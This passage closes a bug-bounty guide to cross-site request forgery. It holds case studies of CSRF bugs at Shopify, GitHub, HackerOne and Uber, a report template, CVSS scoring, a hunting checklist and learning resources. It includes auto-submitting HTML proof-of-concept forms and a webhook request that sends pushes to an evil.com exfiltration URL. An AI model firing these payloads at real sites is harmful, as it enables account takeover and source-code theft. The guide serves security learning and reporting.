→ Could disconnect a partner's connected store
→ Combined with another bug → full partner account takeover

Technical Detail:
1. POST /partners/disconnect_store had no CSRF token
2. The AJAX request used a custom header, but...
3. The server didn't actually CHECK for the custom header
4. Normal form submission worked

PoC:
<form action="https://partners.shopify.com/PARTNER_ID/disconnect_store" 
      method="POST">
    <input name="store_id" value="TARGET_STORE_ID">
</form>
<script>document.forms[0].submit()</script>

Key Takeaway:
→ Just because the frontend SENDS a custom header
   doesn't mean the backend REQUIRES it
→ Always test what happens when you remove custom headers
```

### Case Study 3: GitHub — CSRF on Integration Settings ($5,000)

```
Platform: GitHub
Year: 2018
Hunter: @iangcarroll
Bounty: $5,000

Discovery:
→ CSRF on GitHub's integration/webhook management
→ Could add a malicious webhook to any org repo
→ Webhook would receive ALL push events (source code leakage)

Technical Detail:
1. GitHub used CSRF tokens on most endpoints
2. But /settings/hooks endpoint accepted both JSON and form-encoded
3. JSON requests checked CSRF → protected
4. Form-encoded requests → CSRF token missing!

Attack:
POST /orgs/TARGET_ORG/settings/hooks
Content-Type: application/x-www-form-urlencoded

hook[url]=https://evil.com/exfil&hook[events][]=push&hook[active]=true

Impact: Source code exfiltration for any repository
        where the victim has admin access

Key Takeaway:
→ Content-Type inconsistency is a real attack vector
→ If an API accepts multiple content types, test EACH one
→ CSRF protection on JSON doesn't protect form-encoded
```

### Case Study 4: HackerOne — CSRF on Report Visibility ($7,500)

```
Platform: HackerOne
Year: 2016
Hunter: @yaworsk
Bounty: $7,500

Discovery:
→ CSRF on making private bug reports public
→ Could force a researcher to publicly disclose a report
→ Leaked vulnerability details before the company fixed it

Technical Detail:
1. The "Request Public Disclosure" button
   → POST /reports/REPORT_ID/public_disclosure_request
2. No CSRF token on this endpoint
3. Single-click CSRF could trigger disclosure

Impact:
→ Zero-day vulnerabilities leaked publicly
→ Companies' unfixed bugs exposed to attackers
→ Researchers' private reports made public

Key Takeaway:
→ CSRF on permission/visibility changes can be devastating
→ Even security-focused platforms (HackerOne!) have CSRF bugs
→ Don't assume "security companies" are immune
```

### Case Study 5: Uber — Login CSRF ($8,000)

```
Platform: Uber
Year: 2017  
Hunter: @AJxyz
Bounty: $8,000

Discovery:
→ Login CSRF — could force user to authenticate as attacker
→ Victim unknowingly used attacker's Uber account
→ Victim's payment method and ride history exposed

Technical Detail:
1. POST /login didn't have CSRF protection
2. Attacker creates account with known credentials
3. CSRF force-logs victim into attacker's account
4. Victim adds payment method (thinking it's their account)
5. Victim requests ride → charged to their card → visible in attacker's account
6. Attacker sees victim's pickup/dropoff locations

PoC:
<form action="https://login.uber.com/login" method="POST">
    <input name="email" value="attacker@evil.com">
    <input name="password" value="attacker_pass123">
</form>
<script>document.forms[0].submit()</script>

Impact: 
→ Financial theft (victim's card pays for attacker's rides)
→ Location tracking (see where victim goes)
→ Privacy violation

Key Takeaway:
→ Login CSRF is often underestimated
→ "But the attacker gives away their OWN credentials" → 
   The VICTIM adds their data to the attacker's account
→ Login endpoints need CSRF protection too
```

### Case Study Lessons Compiled

```
┌────────────┬────────────────────────────┬──────────┬────────────────────┐
│ Company    │ Root Cause                 │ Bounty   │ Lesson             │
├────────────┼────────────────────────────┼──────────┼────────────────────┤
│ Facebook   │ OAuth state not validated  │ $25,000  │ Check OAuth flows  │
│ Shopify    │ Custom header not enforced │ $15,000  │ Remove headers     │
│ GitHub     │ Form-encoded not protected │ $5,000   │ Test content types │
│ HackerOne  │ No token on disclosure EP  │ $7,500   │ Check visibility   │
│ Uber       │ Login has no CSRF          │ $8,000   │ Test login pages   │
└────────────┴────────────────────────────┴──────────┴────────────────────┘

Common patterns:
1. Legacy/alternative endpoints lack protection
2. Content-Type switching bypasses defenses  
3. Custom headers present but not enforced
4. OAuth/Login flows overlooked
5. Permission changes under-protected
```

---

## 16. 📝 Writing the CSRF Report

A well-written report is the difference between $500 and $5,000 for the same bug.

### Report Template

```markdown
# CSRF on [Endpoint] Allows [Impact]

## Summary
A Cross-Site Request Forgery vulnerability exists on the [endpoint name] 
endpoint that allows an attacker to [specific action] on behalf of an 
authenticated victim by luring them to a crafted web page.

## Severity
**[Critical / High / Medium / Low]**
CVSS 3.1: [Score] ([Vector String])

## Affected Endpoint
- **URL:** https://target.com/path/to/endpoint
- **Method:** POST
- **Parameters:** param1, param2
- **Authentication:** Session cookie (session_id)

## Vulnerability Details

### Root Cause
The endpoint `POST /path/to/endpoint` performs [action] but does not 
validate a CSRF token or implement other anti-CSRF measures. The session 
cookie has `SameSite=[value]`, which [does/does not] prevent cross-site 
form submissions.

### Missing Protections
- [ ] No CSRF token in request
- [ ] No SameSite cookie attribute (or SameSite=None)
- [ ] No Origin/Referer validation
- [ ] No custom header requirement
- [ ] Endpoint accepts form-encoded Content-Type

## Steps to Reproduce

### Prerequisites
- Two accounts: Attacker account and Victim account
- Victim is logged into target.com

### Step 1: Create the Malicious Page
Save the following HTML as `csrf_poc.html`:

```html
<html>
<body>
<h1>Loading...</h1>
<form id="csrfForm" action="https://target.com/endpoint" method="POST">
    <input type="hidden" name="param1" value="malicious_value">
    <input type="hidden" name="param2" value="malicious_value">
</form>
<script>document.getElementById('csrfForm').submit();</script>
</body>
</html>
```

### Step 2: Host the Page
Host `csrf_poc.html` on an attacker-controlled server.
(For testing: `python3 -m http.server 8080`)

### Step 3: Victim Visits Page
1. Log into target.com as the victim in Chrome
2. In the same browser, navigate to `http://attacker-server:8080/csrf_poc.html`
3. Observe: [describe what happens — email changed, settings modified, etc.]

### Step 4: Verify Impact
1. Check victim's account at target.com/settings
2. Confirm that [param1] has been changed to [malicious_value]

## Impact

An attacker can [specific action] on behalf of any authenticated user
by having them visit a crafted web page. This requires no interaction
beyond clicking a link.

**Specific impacts:**
- [Impact 1: e.g., "Attacker can change victim's email address"]
- [Impact 2: e.g., "Combined with password reset, leads to Account Takeover"]
- [Impact 3: e.g., "Affects all users, including administrators"]

**Attack scenario:**
The attacker embeds the CSRF payload in a page and distributes the link
via email, social media, or forum posts. Any logged-in user who clicks
the link has their [resource] modified without their knowledge.

## Remediation Recommendations

1. **Implement CSRF tokens**: Add a cryptographic CSRF token to all 
   state-changing forms. Validate the token server-side on every request.

2. **Set SameSite=Strict on session cookies**: 
   `Set-Cookie: session_id=...; SameSite=Strict; Secure; HttpOnly`

3. **Validate Origin/Referer headers**: Reject requests where the 
   Origin header doesn't match the expected domain.

4. **Use framework-level CSRF protection**: 
   - Django: `{% csrf_token %}` in forms + `CsrfViewMiddleware`
   - Rails: `protect_from_forgery with: :exception`
   - Express: `csurf` middleware
   - Spring: Built-in CSRF protection (enabled by default)

## Supporting Evidence

### HTTP Request (Normal)
[Paste the legitimate request from Burp]

### HTTP Request (CSRF — No Token)
[Paste the request without CSRF token, showing 200 OK]

### Screenshot: Before Attack
[Screenshot of victim's settings BEFORE the CSRF]

### Screenshot: After Attack
[Screenshot of victim's settings AFTER the CSRF showing the change]

### Video PoC
[Link to screen recording showing full attack]
```

### CVSS Scoring for CSRF

```
CSRF CVSS 3.1 Scoring Guide:

Base Metrics:
├── Attack Vector (AV): Network [N] → Always Network for CSRF
├── Attack Complexity (AC): Low [L] → No special conditions
├── Privileges Required (PR): None [N] → Attacker needs no account
├── User Interaction (UI): Required [R] → Victim must click link
├── Scope (S): Unchanged [U] or Changed [C]
│   └── Changed if CSRF affects other components
├── Confidentiality (C): None/Low/High
│   ├── None → Profile change (no data leaked)
│   ├── Low → Some data exposure
│   └── High → Full data access (via ATO)
├── Integrity (I): Low/High
│   ├── Low → Minor data modification
│   └── High → Critical data modified (email, password)
└── Availability (A): None/Low/High
    ├── None → No disruption
    ├── Low → Temporary disruption
    └── High → Account deletion/lockout

Common CSRF CVSS Scores:
┌──────────────────────────────────┬───────┬──────────────────────────────────┐
│ Scenario                         │ Score │ Vector                           │
├──────────────────────────────────┼───────┼──────────────────────────────────┤
│ Profile bio change               │ 4.3   │ AV:N/AC:L/PR:N/UI:R/S:U/C:N/   │
│                                  │       │ I:L/A:N                          │
│ Email change                     │ 6.5   │ AV:N/AC:L/PR:N/UI:R/S:U/C:N/   │
│                                  │       │ I:H/A:N                          │
│ Email change → ATO               │ 8.1   │ AV:N/AC:L/PR:N/UI:R/S:U/C:H/   │
│                                  │       │ I:H/A:N                          │
│ Admin action via CSRF            │ 8.8   │ AV:N/AC:L/PR:N/UI:R/S:C/C:H/   │
│                                  │       │ I:H/A:N                          │
│ Self-propagating CSRF worm       │ 9.3   │ AV:N/AC:L/PR:N/UI:R/S:C/C:H/   │
│                                  │       │ I:H/A:H                          │
│ Account deletion                 │ 6.5   │ AV:N/AC:L/PR:N/UI:R/S:U/C:N/   │
│                                  │       │ I:N/A:H                          │
└──────────────────────────────────┴───────┴──────────────────────────────────┘
```

### Report Writing Tips

```
DO:
✅ Show the FULL attack chain (CSRF → email change → password reset → ATO)
✅ Include before/after screenshots
✅ Record a video PoC showing the attack in real-time
✅ Provide a working HTML PoC file
✅ Explain the real-world attack scenario
✅ Mention the number of affected users ("all authenticated users")
✅ Test on the LATEST browser versions (Chrome, Firefox)
✅ Note which SameSite bypass you used (if applicable)

DON'T:
❌ Submit "CSRF on profile page" with no impact analysis
❌ Provide a PoC that only works with SameSite disabled
❌ Test on a 2015 browser and claim it's "exploitable"
❌ Report CSRF on GET endpoints that only READ data
❌ Report CSRF on logout (unless you can chain it)
❌ Submit without testing in an actual browser (not just Burp)
❌ Forget to mention SameSite status of the session cookie
```

---

## 17. ✅ CSRF Hunting Checklist

Print this. Use it on every target.

```
╔═══════════════════════════════════════════════════════════════════╗
║                  CSRF HUNTING CHECKLIST v1.0                     ║
║                        by Vishal                                 ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🔍 RECONNAISSANCE                                               ║
║  [ ] Map ALL state-changing endpoints (POST/PUT/PATCH/DELETE)     ║
║  [ ] Check for legacy/v1 API endpoints                           ║
║  [ ] Analyze JavaScript source for hidden endpoints              ║
║  [ ] Check robots.txt and sitemap.xml                            ║
║  [ ] Look for admin panels and internal endpoints                ║
║                                                                   ║
║  🍪 COOKIE ANALYSIS                                              ║
║  [ ] Check SameSite attribute on ALL cookies                     ║
║  [ ] Identify cookies with SameSite=None                         ║
║  [ ] Check for secondary/legacy cookies without SameSite         ║
║  [ ] Check Secure flag (SameSite=None requires Secure)           ║
║  [ ] Check HttpOnly flag                                         ║
║                                                                   ║
║  🛡️ DEFENSE ANALYSIS                                             ║
║  [ ] Identify CSRF token parameter name                          ║
║  [ ] Check if token is in form body, header, or cookie           ║
║  [ ] Check Origin header validation                              ║
║  [ ] Check Referer header validation                             ║
║  [ ] Check for custom header requirements                        ║
║  [ ] Check Content-Type enforcement                              ║
║  [ ] Check CORS configuration                                    ║
║                                                                   ║
║  🧪 TOKEN VALIDATION TESTS                                       ║
║  [ ] Remove token entirely                                       ║
║  [ ] Send empty token value                                      ║
║  [ ] Send random/invalid token                                   ║
║  [ ] Reuse old/expired token                                     ║
║  [ ] Use token from different session (cross-session)            ║
║  [ ] Use token from different endpoint (cross-endpoint)          ║
║  [ ] Check if token changes on each request                      ║
║  [ ] Test token length/format validation                         ║
║                                                                   ║
║  🔄 METHOD & CONTENT-TYPE TESTS                                  ║
║  [ ] Switch POST → GET                                           ║
║  [ ] Switch POST → PUT/PATCH                                     ║
║  [ ] Try _method=POST override in GET params                     ║
║  [ ] Switch application/json → application/x-www-form-urlencoded ║
║  [ ] Switch application/json → text/plain                        ║
║  [ ] Try multipart/form-data                                     ║
║                                                                   ║
║  🌐 ORIGIN/REFERER BYPASS TESTS                                  ║
║  [ ] Send null Origin (sandboxed iframe)                         ║
║  [ ] Remove Referer (meta no-referrer)                           ║
║  [ ] Referer with target domain in path (evil.com/target.com)    ║
║  [ ] Referer with target as subdomain (target.com.evil.com)      ║
║  [ ] Origin from subdomain of target                             ║
║                                                                   ║
║  🔗 CORS TESTS                                                   ║
║  [ ] Check if arbitrary Origin is reflected                      ║
║  [ ] Check if null Origin is allowed                             ║
║  [ ] Check if subdomain Origins are allowed                      ║
║  [ ] Check Access-Control-Allow-Credentials: true                ║
║                                                                   ║
║  🎯 HIGH-VALUE TARGETS                                           ║
║  [ ] Email change                                                ║
║  [ ] Password change (without current password)                  ║
║  [ ] 2FA disable                                                 ║
║  [ ] API key generation/regeneration                             ║
║  [ ] OAuth app authorization                                     ║
║  [ ] Role/permission changes                                     ║
║  [ ] Account deletion                                            ║
║  [ ] Payment method changes                                      ║
║  [ ] Login endpoint                                              ║
║  [ ] Webhook management                                          ║
║                                                                   ║
║  ⬆️ ESCALATION                                                    ║
║  [ ] Can CSRF → ATO? (email change → password reset)             ║
║  [ ] Can CSRF + Self-XSS = Stored XSS?                          ║
║  [ ] Can CSRF + IDOR = target any user?                          ║
║  [ ] Can CSRF + Open Redirect = token theft?                     ║
║  [ ] Can CSRF chain multiple actions?                            ║
║  [ ] Is self-propagating worm possible?                          ║
║                                                                   ║
║  📝 REPORTING                                                     ║
║  [ ] PoC works in latest Chrome + Firefox                        ║
║  [ ] Before/after screenshots captured                           ║
║  [ ] Video PoC recorded                                          ║
║  [ ] Full attack scenario described                              ║
║  [ ] CVSS score calculated                                       ║
║  [ ] Remediation advice included                                 ║
║  [ ] SameSite status documented                                  ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

## 18. 📚 Resources & References

### Books

```
1. "The Web Application Hacker's Handbook" — Stuttard & Pinto
   → Chapter 13: Attacking Users (CSRF deep dive)
   → THE reference book for web app security

2. "Bug Bounty Bootcamp" — Vickie Li
   → Chapter 9: Cross-Site Request Forgery
   → Modern approach with SameSite coverage

3. "Real-World Bug Hunting" — Peter Yaworski
   → Multiple CSRF case studies from HackerOne
   → Practical, bounty-focused

4. "Web Security for Developers" — Malcolm McDonald
   → Clear CSRF explanations for developers
   → Good for understanding the defense side

5. "OWASP Testing Guide v4"
   → Testing for CSRF (OTG-SESS-005)
   → Free: https://owasp.org/www-project-web-security-testing-guide/

6. "The Tangled Web" — Michal Zalewski
   → Deep browser security internals
   → Understanding SOP, cookies, and why CSRF exists

7. "Hacking APIs" — Corey Ball
   → API-specific CSRF techniques
   → REST + GraphQL CSRF attacks
```

### Practice Labs

```
1. PortSwigger Web Security Academy (FREE)
   https://portswigger.net/web-security/csrf
   → 12 CSRF labs from basic to expert
   → BEST free CSRF training

2. DVWA (Damn Vulnerable Web Application)
   https://github.com/digininja/DVWA
   → CSRF challenges at Low/Medium/High levels
   → Good for beginners

3. bWAPP
   http://www.itsecgames.com/
   → Multiple CSRF scenarios
   → Covers login CSRF, stored CSRF

4. HackTheBox Web Challenges
   https://www.hackthebox.com/
   → Realistic CSRF challenges
   → CTF-style with hints

5. OWASP WebGoat
   https://owasp.org/www-project-webgoat/
   → Guided CSRF lessons
   → Step-by-step explanations

6. PentesterLab
   https://pentesterlab.com/
   → CSRF badge exercises
   → Paid but high quality

7. TryHackMe — CSRF Room
   https://tryhackme.com/
   → Beginner-friendly
   → Browser-based (no setup needed)

8. testphp.vulnweb.com (Acunetix)
   → Live vulnerable target
   → Already covered in Section 9

9. HackerOne CTF
   https://ctf.hacker101.com/
   → Real-world style challenges
   → Free by HackerOne

10. Google Gruyere
    https://google-gruyere.appspot.com/
    → CSRF exercises
    → Hosted by Google
```

### Essential Tools

```
Burp Suite Pro                 — CSRF PoC generator, testing, scanning
    https://portswigger.net/burp
    
OWASP ZAP                     — Free alternative to Burp, CSRF scanning
    https://www.zaproxy.org/
    
CSRFPoc (Burp Extension)      — Advanced PoC generation
    BApp Store → Search "CSRFPoc"

CSRF Scanner (Burp Extension)  — Auto-scan for CSRF
    BApp Store → Search "CSRF Scanner"

Param Miner (Burp Extension)   — Discover hidden parameters
    BApp Store → Search "Param Miner"

Logger++ (Burp Extension)      — Advanced request logging
    BApp Store → Search "Logger++"

XSRFProbe                      — Automated CSRF scanner
    https://github.com/0xInfection/XSRFProbe

Bolt                           — CSRF scanner
    https://github.com/s0md3v/Bolt

Browser DevTools               — Cookie analysis, request inspection
    F12 → Application → Cookies → Check SameSite
```

### Useful Links

```
OWASP CSRF Prevention Cheat Sheet
→ https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

OWASP CSRF Testing Guide
→ https://owasp.org/www-community/attacks/csrf

PortSwigger CSRF Research
→ https://portswigger.net/web-security/csrf

SameSite Cookies Explained (web.dev)
→ https://web.dev/samesite-cookies-explained/

Chromium SameSite Updates
→ https://www.chromium.org/updates/same-site/

Mozilla MDN — SameSite
→ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

RFC 6265bis (Cookie specification)
→ https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis

HackerOne Disclosed CSRF Reports
→ https://hackerone.com/hacktivity?type=team&querystring=csrf

Bugcrowd CSRF Write-ups
→ https://bugcrowd.com/vulnerability-rating-taxonomy (search CSRF)

LiveOverflow CSRF Videos
→ https://www.youtube.com/c/LiveOverflow (search CSRF)
```

### Community & Learning

```
Twitter/X: Follow these for CSRF research:
→ @albinowax (PortSwigger researcher)
→ @samaborsk (browser security)
→ @ArbazKiraak (bug bounty CSRF)
→ @NahamSec (live hacking, CSRF tips)
→ @staborsk (web security)

Subreddits:
→ r/bugbounty
→ r/netsec
→ r/websecurity

Discord:
→ Bug Bounty Hunter (NahamSec's)
→ HackerOne Community
→ PortSwigger Web Security

YouTube Channels:
→ PortSwigger (official labs walkthroughs)
→ NahamSec (bug bounty CSRF)
→ STÖK (bug bounty tips)
→ InsiderPhD (academic + practical)
→ LiveOverflow (deep technical)
→ John Hammond (CTF walkthroughs)
```

---

## 🎯 Final Words

```
CSRF is not dead. It's evolving.

SameSite cookies made it harder, not impossible.
Modern SPAs introduced new vectors (JSON, WebSocket, GraphQL).
Legacy endpoints still lurk in production.

The hunters who find CSRF in 2026:
→ Understand browser internals deeply
→ Test every Content-Type variation  
→ Chain CSRF with other bugs for maximum impact
→ Never trust "this endpoint is safe because JSON"
→ Always test in a REAL browser, not just Burp

Start with PortSwigger labs.
Move to real targets on HackerOne/Bugcrowd.
Use the checklist. Follow the methodology.
Report with impact and professionalism.

Happy hunting! 🔥

— Vishal
```

---

> **Document:** CSRF Vulnerability Guide v1.0  
> **Author:** Vishal  
> **Last Updated:** 2026  
> **License:** Educational use only — for authorized security testing
